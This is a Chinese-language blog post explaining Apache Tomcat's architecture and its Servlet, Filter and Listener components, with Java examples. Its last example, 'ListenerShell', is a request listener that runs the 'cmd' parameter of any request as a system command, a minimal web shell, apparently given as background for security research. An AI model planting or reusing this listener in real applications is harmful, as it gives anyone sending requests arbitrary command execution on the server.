Tomcat

Aug 11, 2025
3 minute read

Tomcat是由 Apache 软件基金会属下 Jakarta 项目开发的 Servlet 容器，实现了对Servlet和Java Server Page（JSP）的支持。由于 Tomcat 本身也内含了 HTTP 服务器，因此也可以视作单独的 We b服务器。简单来说，Tomcat 可以看成是 Web 服务器 + Servlet 容器。

0x01 架构

Service + Connector + Container

1.1 Service

一个 Tomcat 服务可以包含多个 Service，每个 Service 相互独立但是共享一个 JVM 和系统类库。一个 Service 维护多个 Connector 和一个 Container。

1.2 Connector

Connector 组件接收并解析 HTTP 请求，然后将一个ServletRequest对象发送给 Container 处理。容器处理完之后会将响应封装成ServletRespone返回给 Connector，然后 Connector 再将ServletRespone解析为 HTTP 响应文本格式发送给客户端。

Connector 可以处理不同的请求协议，包括 HTTP/1.1、HTTP/2、AJP 等。

1.3 Container

Tomcat 的 Container 包含四种子容器：Engine、Host、Context和Wrapper。一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper。

1）Engine

一个Container对应一个Engine，一个 Engine 管理多个 Host。

2）Host

可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。

3）Context

Tomcat 核心组件之一。一个 Context 表示一个应用，Context 之间互相独立，有独立的类加载器，应用之间类隔离。Context 负责启动和停止 Web 应用。当 Tomcat 启动时，它会加载并初始化所有已配置的 Context；当关闭或重新部署时，则会相应地停止这些上下文。

关键属性属性解释
path应用程序的 URL 上下文路径。例如，如果 path 设置为 /myapp，那么可以通过 http://localhost:8080/myapp 访问此应用。
docBase指定 Web 应用的实际位置，可以是绝对路径或相对于 <Host> 的工作目录的相对路径。
reloadable如果设置为 true，当检测到 /WEB-INF/classes/ 或 /WEB-INF/lib/ 下的类发生变化时，Tomcat 将自动重新加载应用程序。这对于开发环境非常有用，但在生产环境中不推荐使用，因为它可能导致性能问题。
crossContext如果设置为 true，允许当前应用与其他应用共享请求调度器对象。默认情况下，这是 false，意味着每个应用都是相互隔离的。

Context 负责管理 Web 应用的生命周期（启动、停止）、资源加载（如静态文件、JSP 页面等）、类加载器等。Tomcat 使用 StandardContext 类作为其默认的 Context 实现。

4）Wrapper

Wrapper 是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet。每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。

0x02 三大组件

2.1 Servlet

Java Server Applet(Little Application)，Java 服务端小型程序。Servlet 是 Java Web 开发的基础组件，负责接收客户端的请求（Request），处理请求、执行业务逻辑），然后生成响应（Response）并发送回客户端。

1）Servlet 生命周期
加载当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例
初始化当Servlet被实例化后，Tomcat调用init()方法初始化这个对象
处理服务当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求
销毁当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁。
卸载当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作
2）HttpServlet

Servlet 通过service() 方法处理请求，所以自定义 Servlet实现业务逻辑需要重写service()方法。Tomcat 封装了 GenericServlet抽象类实现了 Servlet 接口，开发时继承GenericServlet类就不需要每个自定义的 Servlet 都重写 5 个方法，只需要关注重写service()方法。GenericServlet设计是一个通用类，在此基础上，Tomcat 还封装了 HttpServlet 类作为GenericServlet的子类，专门处理 HTTP 协议的请求。

HttpServlet 实现了包括 doGet()、doPost()在内的多个方法用于处理不同HTTP请求方法下的请求，这些方法在service()方法中经过判断请求方法后进行调用。所以开发时，继承HttpServlet类的自定义Servlet只需要关注要处理的请求方法，重写对应的方法即可。

1public class CustomHttpServlet extends HttpServlet {
2    @Override
3    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
4        resp.getWriter().println("<br><h1>Hello Servlet</h1><br>");
5    }
6}

4）ServletContext

Servlet 容器初始化时，会为每一个应用创建一个 ServletContext 对象，应用内的所有 Servlet 共享该对象。不同的 Servlet 可以通过 ServletContext 进行数据交互，获取很多共享资源。ServletContext接口的默认实现是org.apache.catalina.core.ApplicationContext类。

2.2 Filter

Filter是 Java Servlet API 提供的一个重要组件，用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改，可以用来实现诸如日志记录、权限检查、字符编码设置、数据压缩等功能。对客户端来说，Filter相比 Servlet 在更外层，比Servlet先处理请求，后处理响应。

 1package jakarta.servlet;
 2
 3import java.io.IOException;
 4
 5public interface Filter {
 6   default void init(FilterConfig filterConfig) throws ServletException {}
 7
 8   void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException;
 9
10   default void destroy() {}
11}
1）Filter 生命周期
初始化容器调用 init 方法来初始化 Filter。这个方法只会被调用一次，在 Filter 被创建后立即执行。
过滤每次请求或响应经过 Filter 时，容器都会调用 doFilter 方法。该方法可以决定是否继续传递请求/响应到下一个 Filter 或目标资源，也可以对请求和响应做出相应的修改。
销毁当容器决定卸载 Filter 时，会先调用 destroy 方法，然后释放 Filter 实例。
2）Filter 执行顺序

一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个Filter链，并按照一定的顺序依次执行各Filter的doFilter()方法。

  • 基于注解配置：按照类名的字符串比较规则比较，值小的先执行
  • 使用web.xml配置：根据对应的Mapping的顺序，先定义的先执行
3）FilterConfig

类似于 Servlet，Filter 也有对应的 FilterConfig 封装相关信息，并在 init()方法作为参数传入。

2.3 Listener

Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。

1）相关概念
  • 事件（Event）：某个方法被调用，或者属性发生改变
  • 事件源（Source）：被监听的对象（ServletContext、ServletRequest、HttpSession）
  • 监听器（Listener）：用于监听事件源，发生事件时触发监听器
2）监听器
监听器事件源描述
ServletRequestListenerServletRequest用于监听 ServletRequest 对象的创建和销毁
ServletRequestAttributeListener用于监听 ServletRequest 对象的属性新增、移除和替换
ServletContextListenerServletContext用于监听 ServletContext 对象的创建与销毁
ServletContextAttributeListener用于监听 ServletContext 对象的属性新增、移除和替换
HttpSessionListenerHttpSession用于监听 HttpSession 对象的创建和销毁
HttpSessionAttributeListener用于监听 HttpSession 对象的属性新增、移除和替换
HttpSessionBindingListener用于监听实现了 HttpSessionBindingListener 接口的类被绑定到 HttpSession 或从 HttpSession 中解绑
HttpSessionActivationListener用于监听 HttpSession 中对象激活和钝化事件
3）示例
 1@WebListener
 2public class ListenerShell implements ServletRequestListener {
 3    @Override
 4    public void requestInitialized(ServletRequestEvent sre) {
 5        ServletRequestListener.super.requestInitialized(sre);
 6
 7        String cmd = sre.getServletRequest().getParameter("cmd");
 8        if (cmd != null) {
 9            try {
10                Runtime.getRuntime().exec(cmd);
11                System.out.println("ListenerShell");
12            } catch (IOException e) {
13                System.out.println(e);
14            }
15        }
16    }
17
18    public void requestDestroyed(ServletRequestEvent sre) {
19        ServletRequestListener.super.requestDestroyed(sre);
20    }
21}
